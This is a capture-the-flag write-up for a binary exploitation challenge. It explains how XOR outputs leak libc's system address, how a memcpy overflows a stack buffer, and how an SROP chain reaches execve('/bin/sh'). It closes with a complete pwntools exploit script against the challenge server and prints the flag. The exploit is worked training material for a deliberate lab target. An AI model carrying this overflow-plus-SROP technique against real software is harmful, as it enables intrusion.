# Devil's Convergence
## Description
BOOM.
## Analysis 
### High‑Level Design of the Binary

The program is themed around devils from *Chainsaw Man*. The flow:

1. **Control Devil (Makima)** – first interaction
2. **War Devil (Yoru)** – second interaction
3. **Bomb Devil (Reze)** – final interaction where we gain RIP control

There is also a global 8‑byte variable we’ll call `contract_seal`, which is crucial. It is initialized at startup via relocations to hold the **address of `system` in libc**.

### `contract_seal`

Decompiled/annotated:

```c
uint64_t contract_seal;  // global

void initialize(void) {
    // ... some story printing ...
    // via a GLOB_DAT relocation, contract_seal is set to &system
    // in the GOT/PLT resolution process.
}
```

So at runtime:

```c
contract_seal == (uint64_t)system@libc
```

This is the secret key used by all three devils.


### Control Devil: Low 4 Bytes of `system`

The **Control Devil** function (Makima) roughly looks like:

```c
void control_devils_contract(void) {
    char buf[4];

    puts("[CONTROL DEVIL] Submit to her control:");
    read(0, buf, 4);                         // our input

    uint8_t *seal = (uint8_t *)&contract_seal;
    for (int i = 0; i < 4; i++) {
        buf[i] ^= seal[i];                   // XOR with first 4 bytes
    }

    printf("[CONTROL DEVIL] Your dominated essence: ");
    write(1, buf, 4);
    putchar('\n');
}
```

Crucially:

```text
output[i] = input[i] ^ seal[i]
```

So if we choose a **known** input (e.g. `"AAAA"`), then:

```text
seal[i] = output[i] ^ input[i]
```

This gives us the **first 4 bytes** of `contract_seal`.


### War Devil: High 4 Bytes of `system`

The **War Devil** function (Yoru) is similar, but uses the **next 4 bytes** of `contract_seal`:

```c
void war_devils_prophecy(void) {
    char buf[4];

    puts("[WAR DEVIL] Offer your tribute to War:");
    read(0, buf, 4);                         // our input

    uint8_t *seal = (uint8_t *)&contract_seal;
    for (int i = 0; i < 4; i++) {
        buf[i] ^= seal[i+4];                 // XOR with bytes 4..7
    }

    printf("[WAR DEVIL] Your war essence: ");
    write(1, buf, 4);
    putchar('\n');
}
```

Again:

```text
output[i] = input[i] ^ seal[i+4]
=> seal[i+4] = output[i] ^ input[i]
```

Picking a known input like `"BBBB"`, we recover the **high 4 bytes** of `contract_seal`.

Combining both:

```python
key0 = output0 ^ b"AAAA"
key1 = output1 ^ b"BBBB"
key  = key0 + key1   # 8 bytes total
system_leak = u64(key)  # little-endian decode
```

Now we have the **exact runtime address of `system`** in the remote libc:

```text
system_leak = libc_base + libc.sym['system']
=> libc_base = system_leak - libc.sym['system']
```


### Bomb Devil: Stack Overflow with XOR Obfuscation

The final devil, **Bomb Devil** (Reze), has the actual memory corruption bug.

Approximate decompilation:

```c
void bomb_devils_contract(void) {
    char volatile_mixture[0x200];   // actually allocated on heap via malloc
    char buffer[0x50];              // local stack buffer

    uint8_t *seal = (uint8_t *)&contract_seal;

    puts("[BOMB DEVIL] Infuse your energy into the contract:");

    char *ptr = malloc(0x200);
    read(0, ptr, 0x200);            // read 512 bytes from user

    for (int i = 0; i < 0x200; i++) {
        ptr[i] ^= seal[i % 8];      // XOR each byte with repeating key
    }

    memcpy(buffer, ptr, 0x200);     // BUG: copies 0x200 into 0x50 buffer
    free(ptr);

    // function returns, using corrupted stack
}
```

The problem:

- `buffer` is only `0x50` bytes.
- `memcpy` copies `0x200` bytes into it.
- This **overflows** into saved `RBP` and then **saved RIP**.

Stack layout:

```text
[buffer, size 0x50]           ; at [rbp-0x50]
[saved RBP]                   ; at [rbp]
[saved RIP]                   ; at [rbp+8]
```

So from the start of `buffer` to saved RIP is:

```text
offset = 0x50 (buffer) + 0x08 (saved RBP) = 0x58
```

Whatever ends up at `buffer[0x58:0x60]` becomes the new RIP.


###1. The XOR twist

We don’t control `buffer` directly. Data flows as:

```text
our_input -> ptr (heap) --XOR with seal--> ptr -> memcpy -> buffer (stack)
```

So:

```text
buffer[i] = our_input[i] ^ seal[i % 8]
```

If we want a desired byte `D[i]` on the stack, we need to send:

```text
our_input[i] = D[i] ^ seal[i % 8]
```

Since we already recovered all 8 bytes of `contract_seal` (which is `system`), we know the XOR key:

```python
key = p64(system_leak)  # 8-byte repeating key
```

Now we can **pre‑XOR** a desired stack image to get the correct input payload.


### ROP vs SROP – Why We Use Sigreturn

We want to eventually call:

```c
system("/bin/sh");
```

or perform an equivalent `execve("/bin/sh", 0, 0)`.

Given ASLR and PIE, we only know libc base (from the system leak). We must build a ROP chain **inside libc**.

Looking for a classic ROP chain (`pop rdi; ret` → `system("/bin/sh")`) is hard in this libc/gadget set and/or in the challenge’s intended solution. Instead, we use **SROP (Sigreturn-Oriented Programming)**, which works well when:

- We know libc base.
- We can find:
  - A `syscall` instruction.
  - A gadget to set `RAX = 15` (the `rt_sigreturn` syscall number).
- We can build a valid `sigreturn` frame on the stack.

### Useful libc gadgets

In this provided `libc.so.6` we can find:

- A misaligned gadget that acts as **`pop rax; ret`** at offset `0xDD237`:

  ```text
  libc_base + 0xDD237  =>  pop rax; ret
  ```

- A `syscall` instruction at offset `0x288B5`:

  ```text
  libc_base + 0x288B5  =>  syscall
  ```

- The string `"/bin/sh"` at offset found by searching:

  ```python
  BINSH_OFF = next(libc.search(b"/bin/sh"))
  # e.g. 0x1cb42f
  ```

So at runtime:

```python
pop_rax_ret = libc_base + 0xDD237
syscall     = libc_base + 0x288B5
binsh       = libc_base + BINSH_OFF
```


### SROP idea

We craft an **ROP sequence** on the stack:

1. Overwrite RIP with `pop_rax_ret`
2. Next 8 bytes: `0xf` (the syscall number for `rt_sigreturn`)
3. Next 8 bytes: `syscall` (the gadget that will invoke `syscall`)
4. Immediately after that, in memory, we place a `SigreturnFrame` structure that sets:

   ```text
   rax = 59                # SYS_execve
   rdi = binsh             # pointer to "/bin/sh"
   rsi = 0
   rdx = 0
   rip = syscall           # after sigreturn, do syscall again
   rsp = something safe    # not really used by execve
   ```

Execution:

- When `bomb_devils_contract` returns, it jumps to `pop_rax_ret`.
- `pop_rax_ret` pops the next QWORD into `rax` → `rax = 0xf`.
- Then `ret` jumps to the next QWORD → `syscall`.
- That `syscall` executes `rt_sigreturn`, which **restores registers from the frame** we placed on the stack.
- Now:
  - `rax = 59` (`execve`)
  - `rdi = binsh`
  - `rsi = 0`
  - `rdx = 0`
  - `rip = syscall`
- The CPU jumps to `syscall` again → executes `execve("/bin/sh", 0, 0)` → **shell**.


##  Building the Final Payload

We first build the **desired** 0x200‑byte stack image `desired` as if there were no XOR:

```python
offset_to_ret = 0x58  # from buffer start to saved RIP

from pwn import SigreturnFrame

frame = SigreturnFrame()
frame.rax = 59          # execve
frame.rdi = binsh
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall
frame.rsp = 0

desired  = b'A' * offset_to_ret
desired += p64(pop_rax_ret)  # overwritten RIP
desired += p64(0xf)          # rax = rt_sigreturn
desired += p64(syscall)      # syscall; triggers sigreturn
desired += bytes(frame)      # sigreturn frame

desired = desired.ljust(0x200, b'\x00')  # Bomb Devil copies full 0x200
```

Now we encode it with the repeating 8‑byte key:

```python
key = p64(system_leak)  # 8 bytes from the info leak

encoded = bytearray()
for i in range(len(desired)):
    encoded.append(desired[i] ^ key[i % 8])
payload = bytes(encoded)
```

We send this `payload` to the Bomb Devil when prompted:

```text
[BOMB DEVIL] Infuse your energy into the contract:
```


##  Solve

Below is the full pwntools script that implements everything:

- Leaks `system` via Control + War devils.
- Computes libc base.
- Builds SROP payload considering XOR.
- Gets a shell.

```python
#!/usr/bin/env python3
from pwn import *

# ------------------------------------------------------------
# Config
# ------------------------------------------------------------

binary_path = './chal_chainsawman'
libc_path   = './libc.so.6'
ld_path     = './ld-linux-x86-64.so.2'

context.binary = ELF(binary_path, checksec=False)
context.arch   = 'amd64'
context.os     = 'linux'
context.log_level = 'info'

elf  = context.binary
libc = ELF(libc_path, checksec=False)

HOST = 'remote.infoseciitr.in'
PORT = 8005

# Offsets inside the provided libc.so.6
SYSTEM_OFF   = libc.sym['system']                  # 0x58750 for this libc
BINSH_OFF    = next(libc.search(b'/bin/sh'))       # 0x1cb42f

# Manually found gadgets in this specific libc build
POP_RAX_RET_OFF = 0xDD237  # misaligned: 58 c3 → pop rax ; ret
SYSCALL_OFF     = 0x288B5  # syscall


# ------------------------------------------------------------
# Helpers
# ------------------------------------------------------------

def start():
    """
    Start local process (with given ld & libc) or remote.
    Use:
      python3 solve_pwn1.py LOCAL
      python3 solve_pwn1.py      # remote
    """
    if args.LOCAL:
        return process(
            [ld_path, "--library-path", ".", binary_path],
            env={"LD_PRELOAD": libc_path}
        )
    else:
        return remote(HOST, PORT)


def leak_system_key(io):
    """
    Use CONTROL DEVIL (Makima) + WAR DEVIL (Yoru) to leak the
    8-byte contract_seal (which is exactly system@libc).
    """
    # -----------------------------
    # CONTROL DEVIL: low 4 bytes
    # -----------------------------
    io.recvuntil(b"[CONTROL DEVIL] Submit to her control: ")

    payload0 = b'A' * 4
    io.send(payload0)

    io.recvuntil(b"[CONTROL DEVIL] Your dominated essence: ")
    leak0 = io.recvn(4)
    try:
        io.recvline()
    except EOFError:
        pass

    key0 = xor(leak0, payload0)
    log.info(f"key0 (low 4 bytes): {key0.hex()}")

    # -----------------------------
    # WAR DEVIL: high 4 bytes
    # -----------------------------
    io.recvuntil(b"[WAR DEVIL] Offer your tribute to War: ")

    payload1 = b'B' * 4
    io.send(payload1)

    io.recvuntil(b"[WAR DEVIL] Your war essence: ")
    leak1 = io.recvn(4)
    try:
        io.recvline()
    except EOFError:
        pass

    key1 = xor(leak1, payload1)
    log.info(f"key1 (high 4 bytes): {key1.hex()}")

    key = key0 + key1              # 8 bytes, little-endian
    system_leak = u64(key)
    log.success(f"Leaked system address: {hex(system_leak)}")

    return system_leak, key


def build_srop_payload(libc_base, key):
    """
    Build the 0x200-byte payload for Bomb Devil, already XOR-encoded with key.
    libc_base comes from the system leak.
    key is the 8-byte XOR key (system address bytes).
    """
    # Resolve gadgets and useful addresses
    pop_rax_ret = libc_base + POP_RAX_RET_OFF
    syscall     = libc_base + SYSCALL_OFF
    binsh       = libc_base + BINSH_OFF

    log.info(f"libc base        : {hex(libc_base)}")
    log.info(f"pop rax; ret     : {hex(pop_rax_ret)}")
    log.info(f"syscall          : {hex(syscall)}")
    log.info(f"'/bin/sh' string : {hex(binsh)}")

    # SigreturnFrame is available directly from pwntools
    frame = SigreturnFrame()
    frame.rax = 59          # SYS_execve
    frame.rdi = binsh       # "/bin/sh"
    frame.rsi = 0
    frame.rdx = 0
    frame.rip = syscall     # 2nd syscall → execve
    frame.rsp = 0           # doesn't matter, execve doesn't return

    # Stack layout inside bomb_devils_contract:
    #   buffer at [rbp-0x50]
    #   saved RBP at [rbp]
    #   saved RIP at [rbp+8]
    # memcpy(buffer, heap, 0x200) → overflow by 0x1b0 bytes
    offset_to_ret = 0x58    # from start of buffer to saved RIP

    desired  = b'A' * offset_to_ret
    desired += p64(pop_rax_ret)  # overwritten return address
    desired += p64(0xf)          # rax = SYS_rt_sigreturn
    desired += p64(syscall)      # syscall; with rsp pointing at frame
    desired += bytes(frame)      # SigreturnFrame on stack

    # Bomb Devil copies exactly 0x200 bytes
    desired = desired.ljust(0x200, b'\x00')

    # Encode with repeating 8-byte key (system address bytes)
    assert len(key) == 8
    encoded = bytearray()
    for i in range(len(desired)):
        encoded.append(desired[i] ^ key[i % 8])

    return bytes(encoded)


# ------------------------------------------------------------
# Main exploit
# ------------------------------------------------------------

def main():
    io = start()

    # Just let leak_system_key drive the initial menu/banner.
    system_leak, key = leak_system_key(io)

    # Compute libc base from leaked system
    libc_base = system_leak - SYSTEM_OFF
    log.success(f"Computed libc base: {hex(libc_base)}")

    # After WAR DEVIL, story text → Bomb Devil
    io.recvuntil(b"[BOMB DEVIL] Infuse your energy into the contract: ")

    # Build and send 0x200-byte payload
    payload = build_srop_payload(libc_base, key)
    assert len(payload) == 0x200
    io.send(payload)

    # Drop to interactive shell
    io.interactive()


if __name__ == '__main__':
    main()

```
FLAG: `flag{1've_n3ver_g0n3_t0_sch00l_eith3r!}`